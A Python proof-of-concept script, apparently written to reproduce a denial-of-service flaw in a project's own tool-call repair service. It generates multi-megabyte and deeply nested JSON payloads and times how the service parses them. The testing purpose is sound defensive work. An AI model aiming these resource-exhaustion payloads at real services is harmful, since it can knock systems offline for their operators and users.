#!/usr/bin/env python3
"""
Reproduction script for DoS vulnerability in ToolCallRepairService.

This script demonstrates how a maliciously large JSON payload in tool call
repair processing can cause CPU spike and memory exhaustion.

The vulnerability is in src/core/services/tool_call_repair_service.py 
in the _process_json_match method which calls json.loads() without
size validation.
"""

import json
import time
import sys
from pathlib import Path

# Add src directory to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from dev.artifacts.di_helper import get_tool_call_repair_service


def create_malicious_json(size_mb: int = 10) -> str:
    """Create a large nested JSON structure to trigger DoS."""
    print(f"Creating malicious JSON payload of {size_mb}MB...")

    # Create deeply nested structure with large arrays
    malicious_data = {"function_call": {"name": "test_tool", "arguments": {}}}

    # Add large arrays to consume memory and CPU during parsing
    large_array = []
    for i in range(size_mb * 100000):  # Approximately size_mb MB of data
        large_array.append(
            {
                "id": i,
                "data": "x" * 100,  # 100 chars per item
                "nested": {
                    "level1": {
                        "level2": {"level3": {"level4": {"level5": "deep nest" * 10}}}
                    }
                },
            }
        )

    malicious_data["function_call"]["arguments"] = {
        "large_array": large_array,
        "another_array": large_array.copy(),  # Double the size
    }

    return json.dumps(malicious_data)


def create_deeply_nested_json(depth: int = 1000) -> str:
    """Create deeply nested JSON to potentially cause stack overflow."""
    print(f"Creating deeply nested JSON with depth {depth}...")

    def create_nested_dict(current_depth):
        if current_depth <= 0:
            return {"value": "deep_value"}
        return {"nested": create_nested_dict(current_depth - 1)}

    malicious_data = {
        "function_call": {
            "name": "test_tool",
            "arguments": {"deeply_nested": create_nested_dict(depth)},
        }
    }

    return json.dumps(malicious_data)


def test_dos_vulnerability():
    """Test DoS vulnerability in ToolCallRepairService."""
    print("=== ToolCallRepairService DoS Vulnerability Test ===")

    # Initialize service
    repair_service = get_tool_call_repair_service()

    # Test 1: Large payload
    print("\n--- Test 1: Large JSON Payload ---")
    sizes_mb = [1, 5, 10]  # Start small and increase

    for size_mb in sizes_mb:
        print(f"\nTesting with {size_mb}MB payload...")

        # Create malicious JSON
        malicious_json = create_malicious_json(size_mb)
        actual_size_mb = len(malicious_json.encode("utf-8")) / (1024 * 1024)
        print(f"Actual payload size: {actual_size_mb:.2f}MB")

        # Format as code block (one of the attack vectors)
        malicious_content = f"```json\n{malicious_json}\n```"

        # Measure time
        start_time = time.time()

        try:
            # This should trigger vulnerable _process_json_match method
            result = repair_service.repair_tool_calls(malicious_content)

            end_time = time.time()
            duration = end_time - start_time

            print(f"[OK] Processing completed in {duration:.2f} seconds")
            print(
                f"Result: {'Tool call detected' if result else 'No tool call detected'}"
            )

            # If processing takes too long, we've demonstrated DoS
            if duration > 5.0:
                print("[!] DoS vulnerability confirmed: Processing took > 5 seconds!")
                return True

        except MemoryError:
            end_time = time.time()
            duration = end_time - start_time
            print(f"[ERROR] MemoryError after {duration:.2f} seconds")
            print("[!] DoS vulnerability confirmed: Memory exhaustion!")
            return True
        except RecursionError:
            end_time = time.time()
            duration = end_time - start_time
            print(f"[ERROR] RecursionError after {duration:.2f} seconds")
            print("[!] DoS vulnerability confirmed: Stack overflow!")
            return True
        except Exception as e:
            end_time = time.time()
            duration = end_time - start_time
            print(
                f"[ERROR] Processing failed after {duration:.2f} seconds: {type(e).__name__}: {e}"
            )

            if "Memory" in str(e) or "too large" in str(e):
                print("[!] DoS vulnerability confirmed: Resource exhaustion!")
                return True

    # Test 2: Deeply nested payload
    print("\n--- Test 2: Deeply Nested JSON Payload ---")
    depths = [100, 500, 1000]

    for depth in depths:
        print(f"\nTesting with depth {depth}...")

        try:
            nested_json = create_deeply_nested_json(depth)
            actual_size_kb = len(nested_json.encode("utf-8")) / 1024
            print(f"Payload size: {actual_size_kb:.2f}KB")

            # Format as code block
            nested_content = f"```json\n{nested_json}\n```"

            start_time = time.time()

            result = repair_service.repair_tool_calls(nested_content)

            end_time = time.time()
            duration = end_time - start_time

            print(f"[OK] Processing completed in {duration:.2f} seconds")

            if duration > 3.0:
                print("[!] DoS vulnerability confirmed: Deep nesting took > 3 seconds!")
                return True

        except RecursionError:
            print("[ERROR] RecursionError during processing!")
            print("[!] DoS vulnerability confirmed: Stack overflow from deep nesting!")
            return True
        except Exception as e:
            print(f"[ERROR] Error: {type(e).__name__}: {e}")

    # Test 3: Attack vector variations
    print("\n--- Test 3: Various Attack Vectors ---")

    # Test direct JSON without code block
    print("\nTesting direct JSON (no code block)...")
    try:
        direct_json = create_malicious_json(2)  # Smaller for this test
        direct_content = direct_json  # No code block wrapper

        start_time = time.time()
        result = repair_service.repair_tool_calls(direct_content)
        duration = time.time() - start_time

        print(f"Direct JSON processed in {duration:.2f} seconds")

    except Exception as e:
        print(f"Direct JSON failed: {type(e).__name__}: {e}")

    # Test XML-like format
    print("\nTesting tool-like format...")
    try:
        tool_json = create_malicious_json(1)
        tool_content = f'{{"tool": {tool_json}}}'

        start_time = time.time()
        result = repair_service.repair_tool_calls(tool_content)
        duration = time.time() - start_time

        print(f"Tool format processed in {duration:.2f} seconds")

    except Exception as e:
        print(f"Tool format failed: {type(e).__name__}: {e}")

    print("\n=== Test Complete ===")
    print("If any test showed excessive processing time or memory exhaustion,")
    print("the DoS vulnerability is confirmed.")
    print("The ToolCallRepairService._process_json_match method calls json.loads()")
    print("without size validation, allowing DoS attacks through large payloads.")

    return False


if __name__ == "__main__":
    vulnerability_confirmed = test_dos_vulnerability()

    if vulnerability_confirmed:
        print("\n[!] VULNERABILITY CONFIRMED!")
        print("This DoS vulnerability needs to be fixed.")
        sys.exit(1)
    else:
        print("\n[OK] No obvious DoS vulnerability detected in these tests.")
        sys.exit(0)
